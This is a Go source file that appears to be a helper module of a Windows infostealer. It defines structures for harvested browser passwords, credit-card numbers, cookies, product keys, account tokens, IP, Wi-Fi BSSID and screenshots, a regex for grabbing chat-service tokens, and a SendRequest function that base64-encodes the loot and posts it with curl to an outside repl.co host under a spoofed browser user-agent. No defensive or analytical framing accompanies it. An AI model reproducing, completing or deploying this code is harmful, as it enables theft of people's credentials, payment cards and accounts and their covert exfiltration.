package main

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"regexp"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

const (
	numberBytes string = "0123456789"
	letterBytes string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

var (
	USER string = GetUsername()

	LOCAL    string = os.Getenv("LOCALAPPDATA")
	ROAMING  string = os.Getenv("APPDATA")
	TEMP     string = os.Getenv("TEMP")
	PERSONAL string = os.Getenv("USERPROFILE")

	HEADERS [999]string

	TEMPFILEDIR string = TEMP + "\\" + RandStringBytes(16)
)

type geninf struct {
	Ip         string  `json:"ip"`
	Username   string  `json:"username"`
	BSSID      string  `json:"bssid"`
	Info       SysInfo `json:"info"`
	Screenshot string  `json:"screenshot"` // This should be an actual Base64 encoding of the file
}

type dumps struct {
	Passwords   []PASSWD   `json:"passwords"`
	CreditCards []CCARD    `json:"credit-cards"`
	Cookies     []COOKIE   `json:"cookies"`
	ProductKey  PRODUCT_ID `json:"product-key"`
	Tokens      []string   `json:"tokens"`
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

type PLATFORM struct {
	Chromium   bool
	LocalState string
	DataFiles  string
}

type PASSWD struct {
	Url  string `json:"url"`
	User string `json:"username"`
	Pass string `json:"password"`
}

type CCARD struct {
	Name       string `json:"name"`
	Number     string `json:"number"`
	Expiration string `json:"exp"`
}

type COOKIE struct {
	Host  string `json:"url"`
	Name  string `json:"name"`
	Value string `json:"value"`
}

type PRODUCT_ID struct {
	Value string `json:"value"`
	Type  string `json:"type"`
}

type OUTPUT struct {
	GeneralInfo geninf `json:"general-info"`
	Dumps       dumps  `json:"dumps"`
}

type SysInfo struct {
	Hostname string
	Platform string
	CPU      string
	RAM      uint64
	Disk     uint64
}

func CleanUp() {
	_ = os.RemoveAll(TEMPFILEDIR)
}

func main() {}

func FileExists(filePath string) bool {
	_, err := os.OpenFile(filePath, os.O_RDWR, 0666)
	if errors.Is(err, os.ErrNotExist) {
		return false
	} else {
		return true
	}
}

func SendRequest(body string) {

	var encoded_payload string = strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(body)), "=", "")

	exec.Command("curl",
		"--location",
		"--request",
		"POST",
		"https://liveton.studio7.repl.co/go",
		"--header", "Content-Type: application/x-www-form-urlencoded",
		"--header", "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"--data-urlencode", "id="+encoded_payload).Start()

}

func GetUsername() string {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	if strings.Contains(user.Username, "\\") {
		return strings.Split(user.Username, "\\")[1]
	} else {
		return user.Username
	}
}

func FindAllTokens(input string) []string {
	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})|(mfa\\.[\\w-]{84})")
	if e != nil {
		log.Fatalf(e.Error())
	}

	return Expression.FindAllString(input, -1)
}

func RemoveDuplicates[T string | int](sliceList []T) []T {
	allKeys := make(map[T]bool)
	list := []T{}
	for _, item := range sliceList {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}

func FormatTokens(input []string) string {
	output, _ := json.Marshal(RemoveDuplicates(input))
	return string(output)
}

func Slice(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}

func RandStringBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func RandIntBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = numberBytes[rand.Intn(len(numberBytes))]
	}
	return string(b)
}

func GenerateHeaders() {
	for i := 0; i < len(HEADERS); i++ {
		HEADERS[i] = RandIntBytes(6)
	}
}

func ToString(s interface{}) string {
	return fmt.Sprint(s)
}
